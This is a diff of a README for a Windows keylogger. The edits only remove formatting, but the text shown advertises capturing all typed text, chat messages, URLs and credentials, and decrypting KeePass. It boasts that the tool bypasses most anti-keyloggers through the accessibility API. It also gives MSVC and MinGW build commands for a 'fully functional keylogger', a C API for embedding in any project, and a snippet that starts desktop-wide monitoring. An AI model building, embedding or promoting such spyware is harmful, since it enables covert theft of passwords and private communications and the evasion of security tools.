@@ -18,18 +18,18 @@ It captures all text input, chat messages, URL, credentials, and decrypts KeePas
 | **Input Simulation**         | Moves mouse, sends clicks using SetCursorPos + mouse_event               |
 | **Targeted Monitoring**      | By window name, PID, or entire desktop                           |
 | **Stealth**                  | Uses official accessibility API — bypasses most anti-keyloggers         |
-| **Log Queue**                | Up to 20,000 lines, non-blocking read via `spy_read_line_w()`            |
-| **C API**                    | `spy_start()`, spy_stop, `spy_read_line_w()` — embeddable in any project |
+| **Log Queue**                | Up to 20,000 lines, non-blocking read via spy_read_line_w            |
+| **C API**                    | spy_start, spy_stop, spy_read_line_w — embeddable in any project |
 
 ---
-## Build Instructions (STL + MSVC)
+## Build Instructions STL + MSVC
 
 ### Requirements
 - **Windows 10/11**
 - **Visual Studio 2022**
 - **Windows SDK**
 
-### Compile (MSVC)
+### Compile MSVC
 
 ```
 cl *.cpp ^
@@ -39,11 +39,11 @@ cl *.cpp ^
    /link uiautomationcore.lib ole32.lib oleaut32.lib user32.lib psapi.lib
 ```
 
-> Output: `a.exe` — fully functional keylogger
+> Output: a.exe fully functional keylogger
 
 ---
 
-### Compile (MinGW-w64 / GCC)
+### Compile MinGW-w64 / GCC
 
 ```bash
 g++ -std=c++17 -municode -O2 *.cpp ^
@@ -58,12 +58,12 @@ g++ -std=c++17 -municode -O2 *.cpp ^
 | Library                | Purpose                              |
 |------------------------|--------------------------------------|
 | uiautomationcore.lib | UI Automation API                    |
-| ole32.lib`, `oleaut32.lib | COM, BSTR, VARIANT              |
+| ole32.lib, oleaut32.lib | COM, BSTR, VARIANT              |
 | user32.lib           | Window enumeration, mouse input      |
 | psapi.lib            | Process module info                  |
 | STL                | std::wstring, std::mutex, std::thread. |
 
-> **No external dependencies** — pure WinAPI + STL
+> No external dependencies pure WinAPI + STL
 
 ---
 
@@ -71,7 +71,6 @@ g++ -std=c++17 -municode -O2 *.cpp ^
 ```
 int main()
 {
-    // Start: entire desktop, 1s timeout, debug enabled
     if (spy_start(nullptr, 0, 1, 0, 0, 1) != 0) {
         std::wcout << L"[ERROR] Failed to start spy\n";
         return 1;
@@ -97,7 +96,7 @@ int main()
 
 ```
 spy_start(
-    const wchar_t* window_name, // nullptr = entire desktop, or "Firefox"
+    const wchar_t* window_name, // nullptr = entire desktop
     uint32_t pid,               // 0 = ignore
     int timeout_sec,            // debounce, default: 1
     int no_uia_events,          // 1 = disable events
